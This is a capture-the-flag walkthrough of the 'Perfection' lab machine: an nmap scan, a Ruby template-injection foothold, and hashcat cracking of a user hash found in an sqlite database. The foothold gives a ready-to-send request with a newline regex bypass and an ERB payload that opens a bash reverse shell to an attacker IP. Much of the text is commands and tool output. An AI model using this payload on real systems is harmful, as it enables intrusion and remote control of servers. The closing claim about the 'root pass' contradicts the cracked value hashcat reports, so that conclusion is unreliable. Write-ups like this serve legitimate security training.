
# ENUMERATION
## NMAP
```bash
nmap 10.10.11.253 -sC -sV -Pn -p- -T5
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-18 17:18 EEST
Nmap scan report for 10.10.11.253
Host is up (0.047s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.08 seconds
```
We can see that there is a running webserver on port 80.
# Foothold
All we can see form the webapp is a form for the grades and the Webrick version that indicates that the app is served with Ruby.

We can try to bypass the regex by appending a `\n` to the end of the first word and the opening the reverse shell.

Using Burp we can send the following request.
```bash
category1=Test1%0A<%25%3d+IO.popen("bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.7/4444+0>%261'").readlines()+%25>&grade1=99&weight1=90&category2=test2&grade2=99&weight2=3&category3=test3&grade3=99&weight3=2&category4=test4&grade4=99&weight4=3&category5=test5&grade5=99&weight5=2
```
# Priv Escalation
After gaining the reverse shell we can see that the susan is a sudoer.

Looking around the system we can find an email that talks about a migration and provides us a template for the password

```bash
susan@perfection:~$ ls -la
ls -la
total 48
drwxr-x--- 7 susan susan 4096 Feb 26  2024 .
drwxr-xr-x 3 root  root  4096 Oct 27  2023 ..
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .bash_history -> /dev/null
-rw-r--r-- 1 susan susan  220 Feb 27  2023 .bash_logout
-rw-r--r-- 1 susan susan 3771 Feb 27  2023 .bashrc
drwx------ 2 susan susan 4096 Oct 27  2023 .cache
drwx------ 3 susan susan 4096 Oct 27  2023 .gnupg
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .lesshst -> /dev/null
drwxrwxr-x 3 susan susan 4096 Oct 27  2023 .local
drwxr-xr-x 2 root  root  4096 Oct 27  2023 Migration
-rw-r--r-- 1 susan susan  807 Feb 27  2023 .profile
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .python_history -> /dev/null
drwxr-xr-x 4 root  susan 4096 Oct 27  2023 ruby_app
lrwxrwxrwx 1 root  root     9 May 14  2023 .sqlite_history -> /dev/null
-rw-r--r-- 1 susan susan    0 Oct 27  2023 .sudo_as_admin_successful
-rw-r----- 1 root  susan   33 May 18 14:17 user.txt
-rw-r--r-- 1 susan susan   39 Oct 17  2023 .vimrc
```
Inside the Migration folder we find an sqlite db with the password hashes.
```bash
sqlite> select * from users;
select * from users;
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```
After creating a wordlist with susan_nasus_ and the hasfile we can use hashcat to append a 9 digit number to the end of the wordlist and compare the generated hash against the one we found in the database.

```bash
 hashcat -m 1400 -a 6 hash perfection_wl ?d?d?d?d?d?d?d?d?d -O
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 7 7435HS, 6851/13766 MB (2048 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 4 MB

Dictionary cache built:
* Filename..: perfection_wl
* Passwords.: 1
* Bytes.....: 13
* Keyspace..: 1000000000
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a3019934...39023f
Time.Started.....: Sun May 18 18:05:56 2025 (42 secs)
Time.Estimated...: Sun May 18 18:06:38 2025 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (perfection_wl), Left Side
Guess.Mod........: Mask (?d?d?d?d?d?d?d?d?d) [9], Right Side
Guess.Queue.Base.: 1/1 (100.00%)
Guess.Queue.Mod..: 1/1 (100.00%)
Speed.#1.........:  3056.7 kH/s (0.02ms) @ Accel:512 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 125967360/1000000000 (12.60%)
Rejected.........: 0/125967360 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:125967104-125967360 Iteration:0-256
Candidate.Engine.: Device Generator
Candidates.#1....: susan_nasus_981539210 -> susan_nasus_643759210
Hardware.Mon.#1..: Temp: 72c Util: 31%

Started: Sun May 18 18:05:35 2025
Stopped: Sun May 18 18:06:40 2025
```

The root pass is `susan_nasus_643759210` and now we can get the root flag